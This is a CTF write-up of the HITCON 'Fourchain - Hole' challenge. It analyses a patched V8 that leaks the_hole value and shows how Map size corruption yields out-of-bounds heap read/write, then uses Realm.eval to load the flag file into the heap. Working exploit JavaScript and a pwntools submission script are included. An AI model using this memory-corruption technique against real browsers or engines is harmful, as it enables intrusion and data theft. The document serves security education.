# Fourchain - Hole

**Authors:** [Nspace](https://twitter.com/_MatteoRizzo)

**Tags:** pwn, browser, v8

**Points:** 268

> There's a hole in the program ?
> Well I'm sure it's not that of a big deal, after all it's just a small hole that won't do any damage right ?
> ... Right 😨 ?

## Analysis

NOTE: this writeup assumes some familiarity with V8 internals such as how objects are laid out in memory, pointer compression, and pointer tagging.

The challenge gives us patched d8, built from v8 commit `63cb7fb817e60e5633fb622baf18c59da7a0a682`. There are two patch files included in the challenge:

`add_hole.patch`
```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 6e0cd408e7..aafdfb8544 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -395,6 +395,12 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
 
+BUILTIN(ArrayHole){
+    uint32_t len = args.length();
+    if(len > 1) return ReadOnlyRoots(isolate).undefined_value();
+    return ReadOnlyRoots(isolate).the_hole_value();
+}
+
 namespace {
 
 V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc
index 78b0229011..55aaaa03df 100644
--- a/src/builtins/builtins-collections-gen.cc
+++ b/src/builtins/builtins-collections-gen.cc
@@ -1763,7 +1763,7 @@ TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) {
                          "Map.prototype.delete");
 
   // This check breaks a known exploitation technique. See crbug.com/1263462
-  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
+  //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
 
   const TNode<OrderedHashMap> table =
       LoadObjectField<OrderedHashMap>(CAST(receiver), JSMap::kTableOffset);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0e98586f7f..28a46f2856 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -413,6 +413,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel)                         \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel)                      \
+  CPP(ArrayHole)                                                               \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 79bdfbddcf..c42ad4c789 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1722,6 +1722,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtin::kArrayHole:
+      return Type::Oddball();
 
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 9040e95202..a77333287a 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1800,6 +1800,7 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtin::kArrayPrototypeFindIndex, 1, false);
     SimpleInstallFunction(isolate_, proto, "lastIndexOf",
                           Builtin::kArrayPrototypeLastIndexOf, 1, false);
+    SimpleInstallFunction(isolate_, proto, "hole", Builtin::kArrayHole, 0, false);
     SimpleInstallFunction(isolate_, proto, "pop", Builtin::kArrayPrototypePop,
                           0, false);
     SimpleInstallFunction(isolate_, proto, "push", Builtin::kArrayPrototypePush,

```

`d8_strip_global.patch`
```diff
diff --git a/src/d8/d8-posix.cc b/src/d8/d8-posix.cc
index c2571ef3a01..e4f27cfdca6 100644
--- a/src/d8/d8-posix.cc
+++ b/src/d8/d8-posix.cc
@@ -734,6 +734,7 @@ char* Shell::ReadCharsFromTcpPort(const char* name, int* size_out) {
 }
 
 void Shell::AddOSMethods(Isolate* isolate, Local<ObjectTemplate> os_templ) {
+/*    
   if (options.enable_os_system) {
     os_templ->Set(isolate, "system", FunctionTemplate::New(isolate, System));
   }
@@ -748,6 +749,7 @@ void Shell::AddOSMethods(Isolate* isolate, Local<ObjectTemplate> os_templ) {
                 FunctionTemplate::New(isolate, MakeDirectory));
   os_templ->Set(isolate, "rmdir",
                 FunctionTemplate::New(isolate, RemoveDirectory));
+*/
 }
 
 }  // namespace v8
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index c6bacaa732f..63b3c9c27e8 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3266,6 +3266,7 @@ static void AccessIndexedEnumerator(const PropertyCallbackInfo<Array>& info) {}
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
+  /*
   global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
@@ -3284,6 +3285,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
                        FunctionTemplate::New(isolate, ExecuteFile));
+  */
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
@@ -3456,6 +3458,7 @@ Local<FunctionTemplate> Shell::CreateSnapshotTemplate(Isolate* isolate) {
 }
 Local<ObjectTemplate> Shell::CreateD8Template(Isolate* isolate) {
   Local<ObjectTemplate> d8_template = ObjectTemplate::New(isolate);
+  /*
   {
     Local<ObjectTemplate> file_template = ObjectTemplate::New(isolate);
     file_template->Set(isolate, "read",
@@ -3538,6 +3541,7 @@ Local<ObjectTemplate> Shell::CreateD8Template(Isolate* isolate) {
                               Local<Signature>(), 1));
     d8_template->Set(isolate, "serializer", serializer_template);
   }
+  */
   return d8_template;
 }
```

The second patch, `d8_strip_global.patch` is simply removing some builtin functions that programs running in d8 normally have access to. These functions let a JavaScript program do things like open and read files, and they would trivialize the challenge if our exploit could use them. This is pretty standard for V8 challenges.

The first patch, `add_hole.patch`, is the interesting part. It adds a new method called `hole` to `Array.prototype`. The new method is implemented as a C++ builtin, in the function `ArrayHole`. The function doesn't do much, and just returns a special value called `the_hole`.

`the_hole` in V8 is a special object that the engine uses internally to represent the absence of a value. For example, when a JavaScript program creates a sparse array, V8 stores `the_hole` in all uninitialized array slots.

```js
const a = [1, 2];
a[9] = 3; 
%DebugPrint(a);
```

```
DebugPrint: 0x2ef200108b7d: [JSArray]
 - elements: 0x2ef200108b8d <FixedArray[31]> [HOLEY_SMI_ELEMENTS]
 - length: 10
 - elements: 0x2ef200108b8d <FixedArray[31]> {
           0: 1
           1: 2
         2-8: 0x2ef200002459 <the_hole>
           9: 3
       10-30: 0x2ef200002459 <the_hole>
 }
```

`the_hole` is an implementation detail that is not part of the JS standard and is normally invisible to JS code. For example if a program tries to access a slot that contains `the_hole` in a sparse array, the access returns `undefined` and not `the_hole`.

```js
const a = [1, 2];
a[9] = 3; 
console.log(a[8]);
```
```
undefined
```

The author's patch adds a way to get a reference to this normally inaccessible object from JS code. This is interesting from a security perspective because it's likely that many of the built-in functions don't expect to be passed `the_hole` as an argument and might misbehave when that happens. For example the following snippet crashes d8:

```js
const the_hole = [].hole();
the_hole.toString()
```

The patch also comments out some code that references [a bug](https://bugs.chromium.org/p/chromium/issues/detail?id=1263462) in Chromium's bug tracker. The bug describes how a reference to `the_hole` can be used to cause memory corruption.

> It appears that a leaked TheHole value can be used to cause memory corruption due to special handling of TheHole values in JSMaps:
> 
>    ```js
>    var map = new Map();
>    map.set(1, 1);
>    map.set(hole, 1);
>    // Due to special handling of hole values, this ends up setting the size of the map to -1
>    map.delete(hole);
>    map.delete(hole);
>    map.delete(1);
>
>    // Size is now -1
>    //print(map.size);
> 
>    // Set values in the map, which presumably ends up corrupting data in front of
>    // the map storage due to the size being -1
>    for (let i = 0; i < 100; i++) {
>        map.set(i, 1);
>    }
> 
>   // Optionally trigger heap verification if the above didn't already crash
>   //gc();
>   ```
> 
> I haven't verified exactly why this happens, but my guess is that because the TheHole value is used by JSMaps to indicate deleted entries [8], when the code deletes TheHole for the second time, it effectively double-deletes an entry and so decrements the size twice.
> [8] https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-collections-gen.cc;l=1770;drc=1c3085e26a408adb53645f9b5d12fa9f3803df3c

The check that the challenge author commented out was introduced in response to this bug and breaks the exploitation technique described above. This makes it pretty clear that that's how the author wants us to solve the challenge.

## Exploitation

The exploit described in the chromium bug uses `the_hole` to set the length of a JavaScript map to -1. In order to understand what primitives that gives us we first have to find the code that implements the map object and understand how it works.

`JSMap`, the C++ object that represents a JavaScript map is declared in [`js-collection.tq`](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-collection.tq;l=11;drc=f30f4815254b8eed9b23026ea0d984d18bb89c28) and it is basically the same as a `JSCollection`. `JSCollection` only has one field, called `table` which points to the backing hash table. Sadly the field has type `Object` which can point to any JavaScript object. Not very useful. Looking for references to the generated method `JSCollection::table()` we find [some code](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/objects.cc;l=6556;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e) that indicates that `table` is actually of type [`OrderedHashMap`](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/ordered-hash-table.h;l=306;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e). `OrderedHashMap` is itself a subclass of `OrderedHashTable`, which has a [detailed comment](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/ordered-hash-table.h;l=23;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e) describing how the contents of the table are laid out in memory. Cool!

The memory layout of a `OrderedHashTable` (and `OrderedHashMap`) is this:

```
[0]: element count
[1]: deleted element count
[2]: bucket count
[3..(3 + NumberOfBuckets() - 1)]: "hash table",
                         where each item is an offset into the
                         data table (see below) where the first
                         item in this bucket is stored.
[3 + NumberOfBuckets()..length]: "data table", an
                         array of length Capacity() * 3,
                         where the first entrysize items are
                         handled by the derived class and the
                         item at kChainOffset is another entry
                         into the data table indicating the next
                         entry in this hash bucket.
```

In our case each element consists of two JavaScript values (the key and the value), so entrysize = 2 and each entry in the hash table will be 3 words (12 bytes) long (key, value, next element).

In some circumstances the runtime can decide to declare the `OrderedHashTable` obsolete and create a new version. For example that can happen when too many elements are deleted from the table and the occupancy becomes too low. In that case the first word of the old table is not the element count but rather a pointer to the new `OrderedHashTable`. We can distinguish between the two by looking at the tag of the first word of the map. A Smi indicates that the map is active, and a pointer indicates that it's obsolete.

The layout described above is also prefixed with a pointer to a [Map](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/map.h;l=203;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e) object and with the overall size of the map (in words, which in this case are 4 bytes). The table's total size is stored right after the map because `OrderedHashTable` derives from [`FixedArray`](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/fixed-array.tq;l=8;drc=902759b8d72534a01d0f90d6653fd253885cf72f), which has a `length` field. I am pretty sure that this is redundant because the size of the `OrderdHashTable` is always equal to `3 + num_buckets * 7` but maybe it is stored explicitly to help the GC.

The value that the exploit in the Chromium bug sets to -1 is the element count (as we can see in the code [here](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-collections-gen.cc;l=1710;drc=63cb7fb817e60e5633fb622baf18c59da7a0a682), linked to in the bug). We can verify that this is the case by running the code from the Chromium bug and then printing the memory of the map in GDB.

```js
let hole = [].hole();
let map = new Map();

map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);

%DebugPrint(map);
%SystemBreak();
```
```
0x1f0400048c7d <Map map = 0x1f04001855f5>
Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.

pwndbg> x/4wx 0x1f0400048c7c
                   /*  map            properties      elements       table */
0x1f0400048c7c:	0x001855f5	0x00002259	0x00002259	0x00048c8d
pwndbg> x/4wx 0x1f0400048c8c
                   /*  map            length          next table     deleted element count */
0x1f0400048c8c:	0x00002c29	0x00000022	0x00048cd9    	0x00000004
pwndbg> x/4wx 0x1f0400048cd8
                   /*  map            length          next table     deleted element count */
0x1f0400048cd8:	0x00002c29	0x00000022	0x00048d25     0x00000002
pwndbg> x/4wx 0x1f0400048d24
                   /*  map            length          element count  deleted element count */
0x1f0400048d24:	0x00002c29	0x00000022	0xfffffffe     0x00000000
```

As we can see the element count is indeed -1 (whose tagged representation is 0xfffffffe).

Now how do we exploit this? I searched online for the CVE number referenced in the Chromium bug report (CVE-2021-38003) and found [this article by Numen Cyber Labs](https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078) which has some more details on how to exploit the vulnerability. The article provides a PoC exploit which sets the length of an array to 0xffff.

```js
let hole = [].hole();
let map = new Map();
map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);
let a = new Array(1.1, 1.1);

map.set(0x10, -1);
map.set(a, 0xffff);
console.log(a.length);
```

The way the exploit works is by overwriting the bucket count in the `OrderedHashMap` with 0x10, which then makes the next insertion into the map write out of bounds. To see why, let's take a look at [the code](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-collections-gen.cc;l=1554;drc=63cb7fb817e60e5633fb622baf18c59da7a0a682) that implements map insertion. I will include a simplified and commented version here for convenience.

```cpp
TF_BUILTIN(MapPrototypeSet, CollectionsBuiltinsAssembler) {
  // ...

  BIND(&add_entry);
  TVARIABLE(IntPtrT, number_of_buckets);
  TVARIABLE(IntPtrT, occupancy);
  TVARIABLE(OrderedHashMap, table_var, table);
  {
    // Check we have enough space for the entry.
    number_of_buckets = SmiUntag(CAST(UnsafeLoadFixedArrayElement(
        table, OrderedHashMap::NumberOfBucketsIndex())));

    static_assert(OrderedHashMap::kLoadFactor == 2);
    // capacity = number_of_buckets * 2
    const TNode<WordT> capacity = WordShl(number_of_buckets.value(), 1);
    // Read the number of elememts.
    const TNode<IntPtrT> number_of_elements = SmiUntag(
        CAST(LoadObjectField(table, OrderedHashMap::NumberOfElementsOffset())));
    // Read the number of deleted elements.
    const TNode<IntPtrT> number_of_deleted = SmiUntag(CAST(LoadObjectField(
        table, OrderedHashMap::NumberOfDeletedElementsOffset())));
    // occupancy = number_of_elements + number_of_deleted
    occupancy = IntPtrAdd(number_of_elements, number_of_deleted);
    GotoIf(IntPtrLessThan(occupancy.value(), capacity), &store_new_entry);

    // ...
  }
  BIND(&store_new_entry);
  // Store the key, value and connect the element to the bucket chain.
  StoreOrderedHashMapNewEntry(table_var.value(), key, value,
                              entry_start_position_or_hash.value(),
                              number_of_buckets.value(), occupancy.value());
  Return(receiver);
}

void CollectionsBuiltinsAssembler::StoreOrderedHashMapNewEntry(
    const TNode<OrderedHashMap> table, const TNode<Object> key,
    const TNode<Object> value, const TNode<IntPtrT> hash,
    const TNode<IntPtrT> number_of_buckets, const TNode<IntPtrT> occupancy) {

  // bucket = hash & (number_of_buckets - 1)
  const TNode<IntPtrT> bucket =
      WordAnd(hash, IntPtrSub(number_of_buckets, IntPtrConstant(1)));
  // bucket_entry = table[3 + bucket]
  // this is the index in the data table at which the bucket begins
  TNode<Smi> bucket_entry = CAST(UnsafeLoadFixedArrayElement(
      table, bucket, OrderedHashMap::HashTableStartIndex() * kTaggedSize));

  // Store the entry elements.
  // entry_start = occupancy * 3 + number_of_buckets
  const TNode<IntPtrT> entry_start = IntPtrAdd(
      IntPtrMul(occupancy, IntPtrConstant(OrderedHashMap::kEntrySize)),
      number_of_buckets);

  // table[3 + number_of_buckets + occupancy * 3] = key
  UnsafeStoreFixedArrayElement(
      table, entry_start, key, UPDATE_WRITE_BARRIER,
      kTaggedSize * OrderedHashMap::HashTableStartIndex());
  // table[3 + number_of_buckets + occupancy * 3 + 1] = value
  UnsafeStoreFixedArrayElement(
      table, entry_start, value, UPDATE_WRITE_BARRIER,
      kTaggedSize * (OrderedHashMap::HashTableStartIndex() +
                     OrderedHashMap::kValueOffset));
  // table[3 + number_of_buckets + occupancy * 3 + 2] = bucket_entry
  UnsafeStoreFixedArrayElement(
      table, entry_start, bucket_entry,
      kTaggedSize * (OrderedHashMap::HashTableStartIndex() +
                     OrderedHashMap::kChainOffset));

  // Update the bucket head.
  // table[3 + bucket] = occupancy
  UnsafeStoreFixedArrayElement(
      table, bucket, SmiTag(occupancy),
      OrderedHashMap::HashTableStartIndex() * kTaggedSize);

  // Bump the elements count.
  // table[0]++
  const TNode<Smi> number_of_elements =
      CAST(LoadObjectField(table, OrderedHashMap::NumberOfElementsOffset()));
  StoreObjectFieldNoWriteBarrier(table,
                                 OrderedHashMap::NumberOfElementsOffset(),
                                 SmiAdd(number_of_elements, SmiConstant(1)));
}
```

After setting `number_of_elements` to -1 the exploit inserts `(0x10, -1)` into the table. `number_of_buckets` is 2 which is the default for new tables. `number_of_deleted` is 0 because the table got shrunk twice (visible in the memory dump from the previous point), so `occupancy` will also be -1. The newly-inserted entry is 3 words long and is stored at `table[3 + number_of_buckets + occupancy * 3]` which in this case is equal to `table[2]`. That means that the key (0x10) will overwrite the bucket count. The value (-1) will overwrite the pointer to the first bucket, which is fine because -1 indicates an empty bucket. Finally, the element count is incremented, to 0.

The next time the exploit inserts `(a, 0xffff)` into the table. This time `occupancy` is 0 but `number_of_buckets` is 16, so the new entry gets written at `table[19]`, which is 3 words after the end of the table. This works and doesn't crash because the code uses `UnsafeStoreFixedArrayElement`, which [does not emit a bounds check](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/codegen/code-stub-assembler.h;l=1811;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e) to store the entries into the table. So even though the length of the FixedArray that backs the table is known, it's not checked when inserting new elements.

The exploit allocates a JavaScript array right after the map, so the new entry will be written 8 bytes into the object that represents this array. The memory layout of a [JSArray](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-array.tq;l=52;drc=6013fdbac99726a1775f77d03699088a46d12483) is the following:

```
map: Map
properties_or_hash: FixedArray
elements: FixedArray
length: Number
```

The inserted pair overwrites `elements` with the address of the array itself and `length` with 0xffff. This gives us an arbitrary out-of-bounds read and write on the JavaScript heap.

### V8 Sandbox

Recent versions of V8 enable the [V8 sandbox](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit) by default. The goal of the V8 sandbox is to prevent an attacker that has gained arbitrary read and write on the JavaScript heap from corrupting other memory and getting arbitrary code execution in the V8 process. To get the flag we either need to find a bypass for the sandbox. Or we could find a way to get the flag *into* the sandbox instead.

As luck would have it, there is a function in d8 which does exactly that and that the author's patch doesn't remove from the globals. 

d8 exposes a `Realm` object which has a function called `Realm.eval` that can load other JavaScript files. The implementation is [here](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/d8/d8.cc;l=2111;drc=d030a17ad0ce961375e5e8d47cdc3e570b5a8fab) and calls `Shell::ReadSource`, which in turn calls `Shell::ReadFile`. This doesn't directly give us access to the contents of the file that we're loading but it will still load its contents onto the JavaScript heap, where we can read it using our OOB array. This completely bypasses the need for a V8 sandbox escape as long as we know where the flag is located. By reading `/etc/passwd` we can see that there is a user called `ctf` on the server, so we can try `/home/ctf/flag`. By sheer luck our guess was correct and we could use this method to read the flag.

`hitcon{tH3_xPl01t_n0_l0ng3r_wOrk_aF+3r_66c8de2cdac10cad9e622ecededda411b44ac5b3_:((}`

## Final exploit

```js
// Utilities to convert between representations
let f64view = new Float64Array(1);
let u8view = new Uint8Array(f64view.buffer);

let hole = [].hole();
let map = new Map();
map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);
let a = new Array(1.1, 1.1);

map.set(0x10, -1);
map.set(a, 0xffff);

// Load the contents of the flag into the heap
try {
    Realm.eval(0, '/home/ctf/flag', {type: 'classic'});
} catch (e) {
    console.log(e);
}

// Dump the heap
for (let i = 0; i < 1000; i++) {
    f64view[0] = a[i];
    console.log(String.fromCharCode(...u8view));
}
```

```py
from pwn import *
import subprocess

HOST = '35.227.151.88'
PORT = 30262

pow_re = re.compile(rb'hashcash -mb25 ([a-zA-Z0-9]+)')

r = remote(HOST, PORT)
r.recvline()
challenge = r.recvline()
print(challenge)
match = pow_re.search(challenge).group(1).strip()
response = subprocess.check_output(['hashcash', '-mb25', match]).strip()
r.sendline(response)

exploit = read('pwn.js')

r.sendlineafter(b'Your javscript file size: ( MAX: 2000 bytes )', str(len(exploit)).encode())
r.sendlineafter(b'Input your javascript file:', exploit)

s = r.recvall(timeout=1).replace(b"\n", b"").decode()
print(re.findall(r'hitcon\{[ -~]+\}', s))
```

## Table of Contents

- [Prologue](./fourchain-prologue): Introduction
- **[Chapter 1: Hole](./fourchain-hole) (You are here)**
- [Chapter 2: Sandbox](./fourchain-sandbox): Pwning the Chrome Sandbox using `Sandbox`.
- [Chapter 3: Kernel](./fourchain-kernel): Chaining the Cross-Cache Cred Change
- [Chapter 4: Hypervisor](./fourchain-hv): Lord of the MMIO: A Journey to IEM
- [Chapter 5: One for All](./fourchain-fullchain): Uncheesing a Challenge and GUI Troubles
- [Epilogue](./fourchain-epilogue): Closing thoughts